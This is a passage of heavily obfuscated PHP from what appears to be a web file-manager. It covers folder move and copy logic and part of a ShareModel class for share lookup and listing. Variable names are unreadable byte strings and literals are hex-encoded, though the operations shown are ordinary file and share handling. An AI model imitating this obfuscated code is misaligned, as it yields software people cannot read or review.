$ëŒèä˜º); if ($ú¶‡†» && $ïÚ×İ¿æ[$ŠÕ™ì¿ã[411]] == $ŠÕ™ì¿ã[190]) { $ÆÑŸõ¹† = $this->sourceInfo($ú¶‡†»); $®¦‘ÅÛ´ = $this->fileHistory($ÆÑŸõ¹†, $ïÚ×İ¿æ[$ŠÕ™ì¿ã[467]], $ïÚ×İ¿æ[$ŠÕ™ì¿ã[80]]); if (!$®¦‘ÅÛ´) { Model($ŠÕ™ì¿ã[470])->remove($ïÚ×İ¿æ[$ŠÕ™ì¿ã[467]]); } $this->removeNow($Çü›Ã®‰, !1); $this->folderSizeReset($ùıÀ†¦¡); Hook::trigger($ŠÕ™ì¿ã[591], $•Ê¨¾ÍĞ); return $ú¶‡†»; } } $®Íª˜¸È = $ëŒèä˜º ? $ëŒèä˜º : $ïÚ×İ¿æ[$ŠÕ™ì¿ã[32]]; $this->lockMoveStart($Çü›Ã®‰); $this->lockWriteStart($ùıÀ†¦¡, $®Íª˜¸È); $“ÜµŠâã = array($ŠÕ™ì¿ã[560] => array(), $ŠÕ™ì¿ã[592] => !1); $this->clearShare($Çü›Ã®‰, $ùıÀ†¦¡); $´ÇªÏ–› = $this->fileNameExistCache($ùıÀ†¦¡, $ïÚ×İ¿æ[$ŠÕ™ì¿ã[32]]); $­¸ç¶ƒı = $this->_move($Çü›Ã®‰, $ùıÀ†¦¡, $í€ßœ—ü, $“ÜµŠâã, $ëŒèä˜º); $this->sourceCacheClear(); if ($ïÚ×İ¿æ[$ŠÕ™ì¿ã[411]] == $ŠÕ™ì¿ã[89] && $´ÇªÏ–›) { $this->folderSizeResetChildren($­¸ç¶ƒı); } Model($ŠÕ™ì¿ã[192])->linkAdd($“ÜµŠâã[$ŠÕ™ì¿ã[560]]); if ($´ÇªÏ–› && $“ÜµŠâã[$ŠÕ™ì¿ã[592]]) { $this->removeNow($Çü›Ã®‰, !1); } $this->lockMoveEnd($Çü›Ã®‰); $this->lockWriteEnd($ùıÀ†¦¡, $®Íª˜¸È); $this->folderSizeReset($ïÚ×İ¿æ[$ŠÕ™ì¿ã[498]]); $this->folderSizeReset($ùıÀ†¦¡); $²‘‘€µ® = array($ïÚ×İ¿æ[$ŠÕ™ì¿ã[498]], $ùıÀ†¦¡); if ($ïÚ×İ¿æ[$ŠÕ™ì¿ã[411]] == $ŠÕ™ì¿ã[89]) { $²‘‘€µ®[] = $Çü›Ã®‰; } $this->updateModifyTime($²‘‘€µ®); Model($ŠÕ™ì¿ã[564])->eventMove($Çü›Ã®‰, $ïÚ×İ¿æ[$ŠÕ™ì¿ã[498]], $ùıÀ†¦¡); Hook::trigger($ŠÕ™ì¿ã[591], $•Ê¨¾ÍĞ); return $­¸ç¶ƒı; } private function _move($°£ñÎ, $©ãŒşŸ, $ĞÊİá–”, &$ ¸·å¶ , $Š™æö­› = '') { $§²š¥ê¦ =& $_SERVER[¥Ÿ©ÒèÌ]; $ˆû¯«”Ä = $this->sourceInfo($°£ñÎ); $‘—ÁıÁÊ = $ˆû¯«”Ä[$§²š¥ê¦[411]] == $§²š¥ê¦[89]; $Ÿñå†…· = $Š™æö­› ? $Š™æö­› : $ˆû¯«”Ä[$§²š¥ê¦[32]]; $µÃøöºõ = $this->fileNameExistCache($©ãŒşŸ, $Ÿñå†…·); $this->lockMoveStart($°£ñÎ); $this->lockWriteStart($©ãŒşŸ, $Ÿñå†…·); if (!$µÃøöºõ) { return $this->_moveForce($°£ñÎ, $©ãŒşŸ, $Ÿñå†…·); } $ÍöÛŞ° = $µÃøöºõ; $ŒßÃõĞ× = !1; if ($‘—ÁıÁÊ) { if ($ĞÊİá–” == REPEAT_RENAME_FOLDER) { $Ÿñå†…· = $this->fileNameAuto($©ãŒşŸ, $Ÿñå†…·, $ĞÊİá–”, $‘—ÁıÁÊ); $ÍöÛŞ° = $this->_moveForce($°£ñÎ, $©ãŒşŸ, $Ÿñå†…·); } else { if ($ĞÊİá–” == REPEAT_RENAME_FOLDER) { $ĞÊİá–” = REPEAT_RENAME; } $«±Ò”é = $this->_childrenListSelect($°£ñÎ); foreach ($«±Ò”é as $•Ò¢¤º£) { $this->_move($•Ò¢¤º£[$§²š¥ê¦[403]], $µÃøöºõ, $ĞÊİá–”, $ ¸·å¶ ); } $ŒßÃõĞ× = !0; } } else { if ($ĞÊİá–” == REPEAT_SKIP) { $ŒßÃõĞ× = !0; } else { if ($ĞÊİá–” == REPEAT_RENAME || $ĞÊİá–” == REPEAT_RENAME_FOLDER) { $Ÿñå†…· = $this->fileNameAuto($©ãŒşŸ, $Ÿñå†…·, $ĞÊİá–”, $‘—ÁıÁÊ); $ÍöÛŞ° = $this->_moveForce($°£ñÎ, $©ãŒşŸ, $Ÿñå†…·); } else { if ($ĞÊİá–” == REPEAT_REPLACE) { $“Ö¿¢ß´ = $this->sourceInfoCache($µÃøöºõ); $ò†¥ïú = $this->fileHistory($“Ö¿¢ß´, $ˆû¯«”Ä[$§²š¥ê¦[467]], $ˆû¯«”Ä[$§²š¥ê¦[80]]); $ŒßÃõĞ× = !0; if ($ò†¥ïú) { $ ¸·å¶ [$§²š¥ê¦[560]][] = $ˆû¯«”Ä[$§²š¥ê¦[467]]; } } } } } if ($ŒßÃõĞ× && !$ ¸·å¶ [$§²š¥ê¦[592]]) { $ ¸·å¶ [$§²š¥ê¦[592]] = !0; } return $ÍöÛŞ°; } private function _moveForce($†Ä’üÕÎ, $äÔ¨‡¸Ô, $”Ã•×‘˜) { $ÌˆãŠÙµ =& $_SERVER[¥Ÿ©ÒèÌ]; $ôÓĞ»Ùî = $this->sourceInfo($†Ä’üÕÎ); $¾¼À¶Ôç = $this->sourceInfo($äÔ¨‡¸Ô); $‡»öÌ£ì = $ôÓĞ»Ùî[$ÌˆãŠÙµ[411]] == $ÌˆãŠÙµ[89]; $½øÖÛ æ = array($ÌˆãŠÙµ[402] => $¾¼À¶Ôç[$ÌˆãŠÙµ[403]], $ÌˆãŠÙµ[584] => $¾¼À¶Ôç[$ÌˆãŠÙµ[521]] . $¾¼À¶Ôç[$ÌˆãŠÙµ[403]] . $ÌˆãŠÙµ[50], $ÌˆãŠÙµ[580] => $¾¼À¶Ôç[$ÌˆãŠÙµ[412]], $ÌˆãŠÙµ[581] => $¾¼À¶Ôç[$ÌˆãŠÙµ[504]], $ÌˆãŠÙµ[583] => USER_ID, $ÌˆãŠÙµ[421] => $”Ã•×‘˜); $óñ–ŠŒË = $ôÓĞ»Ùî[$ÌˆãŠÙµ[412]] == SourceModel::TYPE_GROUP && $¾¼À¶Ôç[$ÌˆãŠÙµ[412]] == SourceModel::TYPE_GROUP && $ôÓĞ»Ùî[$ÌˆãŠÙµ[504]] == $¾¼À¶Ôç[$ÌˆãŠÙµ[504]]; if (!$óñ–ŠŒË && $this->moveClearAuth) { Model($ÌˆãŠÙµ[502])->authClear($†Ä’üÕÎ); } $¬‚äúãÓ = $ôÓĞ»Ùî[$ÌˆãŠÙµ[431]] == $ÌˆãŠÙµ[89] && $¾¼À¶Ôç[$ÌˆãŠÙµ[431]] != $ÌˆãŠÙµ[89]; if ($¬‚äúãÓ) { $½øÖÛ æ[$ÌˆãŠÙµ[430]] = 0; } if ($‡»öÌ£ì) { $Â®´èì = array($ÌˆãŠÙµ[584] => array($ÌˆãŠÙµ[544], $ôÓĞ»Ùî[$ÌˆãŠÙµ[521]] . $ôÓĞ»Ùî[$ÌˆãŠÙµ[403]] . $ÌˆãŠÙµ[545])); $ Ì½¹¯ = $ôÓĞ»Ùî[$ÌˆãŠÙµ[521]] . $ôÓĞ»Ùî[$ÌˆãŠÙµ[403]] . $ÌˆãŠÙµ[50]; $˜½³øöø = $¾¼À¶Ôç[$ÌˆãŠÙµ[521]] . $¾¼À¶Ôç[$ÌˆãŠÙµ[403]] . $ÌˆãŠÙµ[50] . $ôÓĞ»Ùî[$ÌˆãŠÙµ[403]] . $ÌˆãŠÙµ[50]; $Ö‹ìì³É = array($ÌˆãŠÙµ[584] => array($ÌˆãŠÙµ[593], "\x72\x65\x70\x6c\141\143\x65\50\x70\141\x72\x65\156\164\114\145\x76\145\x6c\54\47{$ Ì½¹¯}\47\x2c\x27{$˜½³øöø}\x27\51"), $ÌˆãŠÙµ[580] => $¾¼À¶Ôç[$ÌˆãŠÙµ[412]], $ÌˆãŠÙµ[581] => $¾¼À¶Ôç[$ÌˆãŠÙµ[504]]); if ($¬‚äúãÓ) { $Ö‹ìì³É[$ÌˆãŠÙµ[430]] = 0; } $this->where($Â®´èì)->data($Ö‹ìì³É)->save(); } $this->where(array($ÌˆãŠÙµ[418] => $†Ä’üÕÎ))->data($½øÖÛ æ)->save(); return $†Ä’üÕÎ; } private function clearShare($”Á”…©¦, $¤»Ìëşö) { $ñ½’ØÇ” =& $_SERVER[¥Ÿ©ÒèÌ]; $³øİáÒø = $this->sourceInfo($”Á”…©¦); $†‚ø¹„Â = $this->sourceInfo($¤»Ìëşö); if ($³øİáÒø[$ñ½’ØÇ”[504]] == $†‚ø¹„Â[$ñ½’ØÇ”[504]] && $³øİáÒø[$ñ½’ØÇ”[412]] == $ñ½’ØÇ”[594]) { return; } $’Ş§¸É¦ = array($ñ½’ØÇ”[521] => array($ñ½’ØÇ”[544], $³øİáÒø[$ñ½’ØÇ”[521]] . $”Á”…©¦ . $ñ½’ØÇ”[545])); $Ôø×¼£À = $this->field($ñ½’ØÇ”[418])->where($’Ş§¸É¦)->getField($ñ½’ØÇ”[403], !0); if (!$Ôø×¼£À) { return; } $’Ş§¸É¦ = array($ñ½’ØÇ”[403] => array($ñ½’ØÇ”[7], $Ôø×¼£À), $ñ½’ØÇ”[495] => 1); $Ù’Â ÷¯ = Model($ñ½’ØÇ”[595])->field($ñ½’ØÇ”[488])->where($’Ş§¸É¦)->select(); if (!$Ù’Â ÷¯) { return; } $Ù’Â ÷¯ = array_to_keyvalue($Ù’Â ÷¯, $ñ½’ØÇ”[12], $ñ½’ØÇ”[488]); $’Ş§¸É¦ = array($ñ½’ØÇ”[488] => array($ñ½’ØÇ”[7], $Ù’Â ÷¯)); Model($ñ½’ØÇ”[595])->where($’Ş§¸É¦)->save(array($ñ½’ØÇ”[495] => 0)); Model($ñ½’ØÇ”[596])->where($’Ş§¸É¦)->delete(); } public function copyFolderFromIO($şüØ›ƒË, $ñ½ şÒ, $æ¶ßµğº, $ª¿«º°Í, $ñ”ú³š„, $¾òƒı†š = false) { $¦§’ş¤Ê =& $_SERVER[¥Ÿ©ÒèÌ]; $è•™ßÜ = array($¦§’ş¤Ê[561] => array(), $¦§’ş¤Ê[562] => array(), $¦§’ş¤Ê[560] => array(), $¦§’ş¤Ê[597] => array()); $«ö¤ù¼ø = $¾òƒı†š ? $¾òƒı†š : $şüØ›ƒË->pathThis($ñ½ şÒ); $‡å‹Íæè = $this->fileNameExist($æ¶ßµğº, $«ö¤ù¼ø); $‰ë‡Ñã = $this->mkdir($æ¶ßµğº, $«ö¤ù¼ø, $ª¿«º°Í); if (!$‡å‹Íæè || $ª¿«º°Í == REPEAT_RENAME_FOLDER) { $ª¿«º°Í = !1; } if ($‡å‹Íæè) { $this->_childrenAllMake($‡å‹Íæè); } Hook::trigger($¦§’ş¤Ê[598]); $this->_copyChildTo($şüØ›ƒË, $ñ½ şÒ, $‰ë‡Ñã, $ª¿«º°Í, $è•™ßÜ, $ñ”ú³š„); Hook::trigger($¦§’ş¤Ê[599]); if ($‰ë‡Ñã) { $this->folderSizeResetChildren($‰ë‡Ñã); } $this->_childrenListClear(); Model($¦§’ş¤Ê[563])->addAll($è•™ßÜ[$¦§’ş¤Ê[561]], array(), !0); Model($¦§’ş¤Ê[564])->eventCopy($‰ë‡Ñã); $this->saveAll($è•™ßÜ[$¦§’ş¤Ê[562]]); Model($¦§’ş¤Ê[470])->linkAdd($è•™ßÜ[$¦§’ş¤Ê[560]]); Model($¦§’ş¤Ê[470])->remove($è•™ßÜ[$¦§’ş¤Ê[597]]); $this->folderSizeReset($æ¶ßµğº); $this->updateModifyTime($æ¶ßµğº); return $‰ë‡Ñã; } private function _copyChildTo($±™ŞĞúû, $“´¸ìğ·, $çñÙ½†ş, $ö¬¶œì´, &$ãìâ÷, $˜ÂìÖË¹) { $Ñ¿¾àû =& $_SERVER[¥Ÿ©ÒèÌ]; $ù’œ† = $this->sourceInfoCache($çñÙ½†ş); $€ËÈå™¾ = $±™ŞĞúû->listPath($“´¸ìğ·); $€ËÈå™¾ = $€ËÈå™¾ ? $€ËÈå™¾ : array($Ñ¿¾àû[76] => array(), $Ñ¿¾àû[77] => array()); $²èÄ·Óë = array_merge($€ËÈå™¾[$Ñ¿¾àû[76]], $€ËÈå™¾[$Ñ¿¾àû[77]]); $ÑØè¬÷ú = $this->_addFiles($±™ŞĞúû, $€ËÈå™¾[$Ñ¿¾àû[76]], $˜ÂìÖË¹); $ïš¿­â = array(); foreach ($²èÄ·Óë as &$Œ‹½ç‚) { if (isset($ÑØè¬÷ú[$Œ‹½ç‚[$Ñ¿¾àû[32]]])) { $Œ‹½ç‚ = $ÑØè¬÷ú[$Œ‹½ç‚[$Ñ¿¾àû[32]]]; } $Œ‹½ç‚[$Ñ¿¾àû[411]] = $Œ‹½ç‚[$Ñ¿¾àû[33]] == $Ñ¿¾àû[79]; $Œ‹½ç‚[$Ñ¿¾àû[413]] = _get($Œ‹½ç‚, $Ñ¿¾àû[167], $Ñ¿¾àû[12]); $Œ‹½ç‚[$Ñ¿¾àû[80]] = _get($Œ‹½ç‚, $Ñ¿¾àû[80], 0); $Œ‹½ç‚[$Ñ¿¾àû[467]] = _get($Œ‹½ç‚, $Ñ¿¾àû[467], 0); if (!isset($Œ‹½ç‚[$Ñ¿¾àû[600]]) && $Œ‹½ç‚[$Ñ¿¾àû[467]]) { $ãìâ÷[$Ñ¿¾àû[597]][] = $Œ‹½ç‚[$Ñ¿¾àû[467]]; } if ($ö¬¶œì´) { $¼ìİÑß = $this->fileNameExistCache($çñÙ½†ş, $Œ‹½ç‚[$Ñ¿¾àû[32]]); if ($¼ìİÑß) { if ($Œ‹½ç‚[$Ñ¿¾àû[411]] || $ö¬¶œì´ == REPEAT_SKIP) { continue; } if ($ö¬¶œì´ == REPEAT_REPLACE) { $äÒÇÖ„Ü = $this->sourceInfoCache($¼ìİÑß); $¾ˆçêè  = $this->fileHistory($äÒÇÖ„Ü, $Œ‹½ç‚[$Ñ¿¾àû[467]], $Œ‹½ç‚[$Ñ¿¾àû[80]]); if ($¾ˆçêè ) { $ãìâ÷[$Ñ¿¾àû[560]][] = $Œ‹½ç‚[$Ñ¿¾àû[467]]; } continue; } else { if ($ö¬¶œì´ == REPEAT_RENAME) { $Œ‹½ç‚[$Ñ¿¾àû[32]] = $this->fileNameAutoCache($çñÙ½†ş, $Œ‹½ç‚[$Ñ¿¾àû[32]], $ö¬¶œì´, !1); } } } } if (!$Œ‹½ç‚[$Ñ¿¾àû[411]] && $Œ‹½ç‚[$Ñ¿¾àû[467]] == 0) { continue; } if (!$Œ‹½ç‚[$Ñ¿¾àû[411]] && $Œ‹½ç‚[$Ñ¿¾àû[467]]) { $ãìâ÷[$Ñ¿¾àû[560]][] = $Œ‹½ç‚[$Ñ¿¾àû[467]]; } $ïš¿­â[] = $this->_makeItemData($Œ‹½ç‚, $ù’œ†, $Œ‹½ç‚[$Ñ¿¾àû[32]]); } unset($Œ‹½ç‚); if (!empty($ïš¿­â)) { $this->addAll($ïš¿­â); $this->_childrenListSelect($çñÙ½†ş); } $ÊòÑ±ï‡ = $this->_childrenList($çñÙ½†ş); $ÊòÑ±ï‡ = array_to_keyvalue($ÊòÑ±ï‡, $Ñ¿¾àû[32]); foreach ($²èÄ·Óë as $Œ‹½ç‚) { $äÒÇÖ„Ü = $ÊòÑ±ï‡[$Œ‹½ç‚[$Ñ¿¾àû[32]]]; $Î Üõ× = $äÒÇÖ„Ü[$Ñ¿¾àû[403]]; $this->_copyApplyMeta($äÒÇÖ„Ü, $ãìâ÷); if ($Œ‹½ç‚[$Ñ¿¾àû[33]] == $Ñ¿¾àû[79]) { $Œ‹½ç‚[$Ñ¿¾àû[78]] = $±™ŞĞúû->getPathInner($Œ‹½ç‚[$Ñ¿¾àû[78]]); $this->_copyChildTo($±™ŞĞúû, $Œ‹½ç‚[$Ñ¿¾àû[78]], $Î Üõ×, $ö¬¶œì´, $ãìâ÷, $˜ÂìÖË¹); } } } private function _addFiles($§öˆÅš£, $ù¨²Ş‚±, $½‡ï°³Ï) { $—òÀî =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ù¨²Ş‚± || count($ù¨²Ş‚±) == 0) { return array(); } $‘ü¡èÁÔ = array(); foreach ($ù¨²Ş‚± as &$ÂæÈôò‡) { Hook::trigger($—òÀî[601], $ÂæÈôò‡); $ÂæÈôò‡[$—òÀî[78]] = $§öˆÅš£->getPathInner($ÂæÈôò‡[$—òÀî[78]]); $±«°«ƒÕ = $§öˆÅš£->hashSimple($ÂæÈôò‡[$—òÀî[78]]); $á«†Í£ = $§öˆÅš£->hashMd5($ÂæÈôò‡[$—òÀî[78]]); if (strlen($á«†Í£) > 10 && !isset($‘ü¡èÁÔ[$á«†Í£])) { $‘ü¡èÁÔ[$á«†Í£] = array(); } $ÂæÈôò‡[$—òÀî[170]] = $±«°«ƒÕ; $ÂæÈôò‡[$—òÀî[169]] = $á«†Í£; Hook::trigger($—òÀî[602], $ÂæÈôò‡); $‘ü¡èÁÔ[$á«†Í£][] =& $ÂæÈôò‡; if (count($‘ü¡èÁÔ[$á«†Í£]) > 1) { $ÂæÈôò‡[$—òÀî[600]] = !0; } } unset($ÂæÈôò‡); $À¨ùÑ¹ = array($—òÀî[169] => array($—òÀî[7], array_keys($‘ü¡èÁÔ))); $áóŒËŠ· = Model($—òÀî[603]); $†ü„¤Ìü = $áóŒËŠ·->where($À¨ùÑ¹)->select(); $†ü„¤Ìü = $†ü„¤Ìü ? $†ü„¤Ìü : array(); foreach ($†ü„¤Ìü as $¨´¨ÎÒ§) { if (!isset($‘ü¡èÁÔ[$¨´¨ÎÒ§[$—òÀî[169]]])) { continue; } $¨ÛªÄ£ = $‘ü¡èÁÔ[$¨´¨ÎÒ§[$—òÀî[169]]]; foreach ($¨ÛªÄ£ as &$ÂæÈôò‡) { $ÂæÈôò‡[$—òÀî[467]] = $¨´¨ÎÒ§[$—òÀî[467]]; $ÂæÈôò‡[$—òÀî[600]] = !0; } unset($ÂæÈôò‡); } $òª‚ıšç = array(); foreach ($ù¨²Ş‚± as $Íä‹ì·é) { if (isset($Íä‹ì·é[$—òÀî[600]]) && $Íä‹ì·é[$—òÀî[600]]) { continue; } $áÙªëÙá = $§öˆÅš£->getPathInner($Íä‹ì·é[$—òÀî[78]]); $ßÏµ¬¼Å = $áóŒËŠ·->addFileMake($áÙªëÙá, $Íä‹ì·é[$—òÀî[80]], $Íä‹ì·é[$—òÀî[170]], $Íä‹ì·é[$—òÀî[169]], $Íä‹ì·é[$—òÀî[32]], $½‡ï°³Ï); if (!is_array($ßÏµ¬¼Å)) { continue; } $òª‚ıšç[] = $ßÏµ¬¼Å; } $áóŒËŠ·->addAll($òª‚ıšç); $À¨ùÑ¹ = array($—òÀî[169] => array($—òÀî[7], array_keys($‘ü¡èÁÔ))); $†ü„¤Ìü = $áóŒËŠ·->where($À¨ùÑ¹)->select(); $†ü„¤Ìü = $†ü„¤Ìü ? $†ü„¤Ìü : array(); foreach ($†ü„¤Ìü as $¨´¨ÎÒ§) { if (!isset($‘ü¡èÁÔ[$¨´¨ÎÒ§[$—òÀî[169]]])) { continue; } $‚ğøÒÎ =& $‘ü¡èÁÔ[$¨´¨ÎÒ§[$—òÀî[169]]]; foreach ($‚ğøÒÎ as &$ÂæÈôò‡) { $ÂæÈôò‡[$—òÀî[467]] = $¨´¨ÎÒ§[$—òÀî[467]]; } unset($ÂæÈôò‡); } $•‘Š»™Õ = array(); foreach ($ù¨²Ş‚± as $ëïÏœ”Ú) { $•‘Š»™Õ[$ëïÏœ”Ú[$—òÀî[32]]] = $ëïÏœ”Ú; } return $•‘Š»™Õ; } } define($_SERVER[¥Ÿ©ÒèÌ][604], $_SERVER[¥Ÿ©ÒèÌ][605]); $uwpreasvnk = $_SERVER[¥Ÿ©ÒèÌ][606]; goto AŒÙ“Íâã; f…«¹Ë‰¬: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\x6d\157\144\151\146\171\x54\x69\155\145", "\164\151\155\145", "\x69\156\x73\x65\162\x74\x2c\165\160\144\141\164\x65", "\146\165\x6e\143\x74\151\157\x6e"), array("\143\x72\x65\x61\164\x65\124\151\x6d\145", "\x74\x69\155\145", "\151\156\x73\x65\x72\164", "\x66\165\156\x63\x74\x69\157\x6e"), array("\157\x70\164\151\x6f\x6e\163", '', "\151\156\x73\145\162\x74\54\165\x70\144\141\164\145\x2c\163\145\154\145\x63\164", "\152\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($êªú‚ÖÜ) { $Ñîİš‡¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ä–‹ÑØ = isset($êªú‚ÖÜ[0]) ? $êªú‚ÖÜ[0] : !1; return array($Ñîİš‡¬[1941] => array(USER_ID, $Ñîİš‡¬[1942]), $Ñîİš‡¬[1886] => array($Ä–‹ÑØ, $Ñîİš‡¬[1943])); } protected function listSimple() { $íŞı‚Ïı = array($_SERVER[¥Ÿ©ÒèÌ][1639] => USER_ID); $˜’‘˜‘ = $this->field($this->fieldList)->where($íŞı‚Ïı)->select(); return $˜’‘˜‘ ? $˜’‘˜‘ : array(); } protected function getInfo($Äğ¨²•, $ùë¬ì£ç = false) { $ü¢„¹¼Ÿ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ùë¬ì£ç) { return $this->_getShareInfo(array($ü¢„¹¼Ÿ[488] => $Äğ¨²•)); } $´í·–â› = $this->cacheFunctionGet($ü¢„¹¼Ÿ[1888], $Äğ¨²•); return $´í·–â›; } public function getInfoByHash($–ù¹Ø¢Ò) { return $this->_getShareInfo(array($_SERVER[¥Ÿ©ÒèÌ][490] => $–ù¹Ø¢Ò)); } public function getInfoByPath($Ö©Õ¨øÜ) { $û—Î«—ø =& $_SERVER[¥Ÿ©ÒèÌ]; $ÅØõã€¼ = array($û—Î«—ø[1639] => USER_ID, $û—Î«—ø[403] => $Ö©Õ¨øÜ); return $this->_getShareInfo($ÅØõã€¼); } public function getInfoBySourcePath($•± ÕØÑ) { $³èú®‘Ü =& $_SERVER[¥Ÿ©ÒèÌ]; $Ë†ø¾£— = array($³èú®‘Ü[1639] => USER_ID, $³èú®‘Ü[1160] => $•± ÕØÑ); return $this->_getShareInfo($Ë†ø¾£—); } private function _getShareInfo($šÏ‘ş·ú) { $ëŒÇ =& $_SERVER[¥Ÿ©ÒèÌ]; $İìÏÎ´‡ = $this->where($šÏ‘ş·ú)->find(); if (!$İìÏÎ´‡) { return !1; } $šÏ‘ş·ú = array($ëŒÇ[488] => $İìÏÎ´‡[$ëŒÇ[488]]); $Ş×®Ò€€ = $ëŒÇ[1944]; $¸ÏäŒ¦Ï = Model($ëŒÇ[596])->order($ëŒÇ[401])->field($Ş×®Ò€€)->where($šÏ‘ş·ú)->select(); if ($İìÏÎ´‡[$ëŒÇ[403]] == $ëŒÇ[190]) { $İìÏÎ´‡[$ëŒÇ[87]] = IO::info($İìÏÎ´‡[$ëŒÇ[1160]]); } else { $İìÏÎ´‡[$ëŒÇ[87]] = Model($ëŒÇ[1311])->pathInfo($İìÏÎ´‡[$ëŒÇ[403]]); } $İìÏÎ´‡[$ëŒÇ[1945]] = $¸ÏäŒ¦Ï; return $İìÏÎ´‡; } protected function getInfoAuth($¤Š¶Û¸ü) { $“¨ŒŞø­ =& $_SERVER[¥Ÿ©ÒèÌ]; $‘íü¯ï = $this->getInfo($¤Š¶Û¸ü); if ($‘íü¯ï[$“¨ŒŞø­[1639]] == USER_ID) { $‘íü¯ï[$“¨ŒŞø­[414]] = $‘íü¯ï[$“¨ŒŞø­[87]][$“¨ŒŞø­[414]]; } else { $‘íü¯ï[$“¨ŒŞø­[414]] = Model($“¨ŒŞø­[502])->authMake($‘íü¯ï[$“¨ŒŞø­[1945]]); } return $‘íü¯ï; } protected function listData($ëâıª‹Œ = null, $öõı“¨× = 300) { $¦®Ì¶Ÿ =& $_SERVER[¥Ÿ©ÒèÌ]; $Œ„œñä¹ = array(array($¦®Ì¶Ÿ[493] => array($¦®Ì¶Ÿ[998], 0), $¦®Ì¶Ÿ[495] => array($¦®Ì¶Ÿ[998], 0), $¦®Ì¶Ÿ[1946] => $¦®Ì¶Ÿ[1902])); if ($ëâıª‹Œ == $¦®Ì¶Ÿ[1947]) { $Œ„œñä¹ = array($¦®Ì¶Ÿ[493] => 1); } else { if ($ëâıª‹Œ == $¦®Ì¶Ÿ[1145]) { $Œ„œñä¹ = array($¦®Ì¶Ÿ[495] => 1); } } $Œ„œñä¹[$¦®Ì¶Ÿ[1639]] = USER_ID; $Š Ñ°Û = $this->where($Œ„œñä¹)->selectPage($öõı“¨×); return $Š Ñ°Û; } protected function listToMe($ÌëİúÀè = 300) { $Ë©³æâ‡ =& $_SERVER[¥Ÿ©ÒèÌ]; $Å›ÜšâÜ = Model($Ë©³æâ‡[1948])->userGroupParents(USER_ID); $ÔëŒß‹æ = array($Ë©³æâ‡[580] => SourceModel::TYPE_USER, $Ë©³æâ‡[504] => USER_ID); if ($Å›ÜšâÜ) { $ÔëŒß‹æ = array(array($Ë©³æâ‡[580] => SourceModel::TYPE_USER, $Ë©³æâ‡[504] => USER_ID), array($Ë©³æâ‡[580] => SourceModel::TYPE_GROUP, $Ë©³æâ‡[504] => array($Ë©³æâ‡[7], $Å›ÜšâÜ)), $Ë©³æâ‡[1946] => $Ë©³æâ‡[1902]); } $ÃªÛ™Ôª = Model($Ë©³æâ‡[596])->where($ÔëŒß‹æ)->selectPage($ÌëİúÀè); $ğÖÈ© = array_to_keyvalue_group($ÃªÛ™Ôª[$Ë©³æâ‡[373]], $Ë©³æâ‡[488]); if (!$ğÖÈ©) { return $ÃªÛ™Ôª; } $úòù˜ôÛ = $Ë©³æâ‡[1949]; $ÔëŒß‹æ = array($Ë©³æâ‡[488] => array($Ë©³æâ‡[419], array_keys($ğÖÈ©)), $Ë©³æâ‡[1639] => array($Ë©³æâ‡[1000], $Ë©³æâ‡[190])); $‰ˆŞ™´× = $this->field($úòù˜ôÛ)->where($ÔëŒß‹æ)->select(); foreach ($‰ˆŞ™´× as $èô˜š°› => &$ıÊÌõ¾³) { $ıÊÌõ¾³[$Ë©³æâ‡[1945]] = $ğÖÈ©[$ıÊÌõ¾³[$Ë©³æâ‡[488]]]; } unset($ıÊÌõ¾³); $ƒÄ‰§• = array($Ë©³æâ‡[1950] => $‰ˆŞ™´×, $Ë©³æâ‡[1951] => $ÃªÛ™Ôª[$Ë©³æâ‡[370]]); return $ƒÄ‰§•; } protected function shareAdd($À€€Å«©, $ìÃ‰«³œ) { $İö°ÂŠ‚ =& $_SERVER[¥Ÿ©ÒèÌ]; $ª™íÜ¶ = $this->_addShareData($À€€Å«©, $ìÃ‰«³œ); if (!empty($ìÃ‰«³œ[$İö°ÂŠ‚[1952]])) { $this->_shareAuthSet($ª™íÜ¶, $ìÃ‰«³œ[$İö°ÂŠ‚[1952]]); } $this->shareEventAdd($À€€Å«©, $ìÃ‰«³œ, $İö°ÂŠ‚[1148]); return $ª™íÜ¶; } protected function shareAddSystem($®‘®à, $‡Àñú¹ı) { $œ¤¤ÆÂ‡ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ìûº¼ûê = $this->_addShareData($®‘®à, $‡Àñú¹ı, $œ¤¤ÆÂ‡[1260]); $this->_shareAuthSet($Ìûº¼ûê, $‡Àñú¹ı[$œ¤¤ÆÂ‡[1952]]); return $Ìûº¼ûê; } private function shareEventAdd($È¦ ¹Œ, $ƒ’Ã¨–¯, $³Şíø»½ = "\141\x64\144") { $êª·ßÔ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$È¦ ¹Œ || $È¦ ¹Œ == $êª·ßÔ[190]) { return; } if ($³Şíø»½ == $êª·ßÔ[1148]) { if ($ƒ’Ã¨–¯[$êª·ßÔ[493]] == $êª·ßÔ[89]) { Model($êª·ßÔ[564])->eventShare($È¦ ¹Œ, $êª·ßÔ[1953]); } if ($ƒ’Ã¨–¯[$êª·ßÔ[495]] == $êª·ßÔ[89]) { Model($êª·ßÔ[564])->eventShare($È¦ ¹Œ, $êª·ßÔ[1954]); } return; } $³ôŒÀåË = $this->getInfoByPath($È¦ ¹Œ); $ñ“¥…†ú = $êª·ßÔ[1955]; if ($³ôŒÀåË[$êª·ßÔ[493]] == $êª·ßÔ[190] && $ƒ’Ã¨–¯[$êª·ßÔ[493]] == $êª·ßÔ[89]) { $ñ“¥…†ú = $êª·ßÔ[1953]; } if ($³ôŒÀåË[$êª·ßÔ[493]] == $êª·ßÔ[89] && $ƒ’Ã¨–¯[$êª·ßÔ[493]] == $êª·ßÔ[190]) { $ñ“¥…†ú = $êª·ßÔ[1956]; } if ($³ôŒÀåË[$êª·ßÔ[495]] == $êª·ßÔ[190] && $ƒ’Ã¨–¯[$êª·ßÔ[495]] == $êª·ßÔ[89]) { $ñ“¥…†ú = $êª·ßÔ[1954]; } if ($³ôŒÀåË[$êª·ßÔ[495]] == $êª·ßÔ[89] && $ƒ’Ã¨–¯[$êª·ßÔ[495]] == $êª·ßÔ[190]) { $ñ“¥…†ú = $êª·ßÔ[1957]; } Model($êª·ßÔ[564])->eventShare($È¦ ¹Œ, $ñ“¥…†ú); return; } private function _addShareData($œÚ­Şº–, $òŠ½¸ÇË = array(), $’§‹š³ 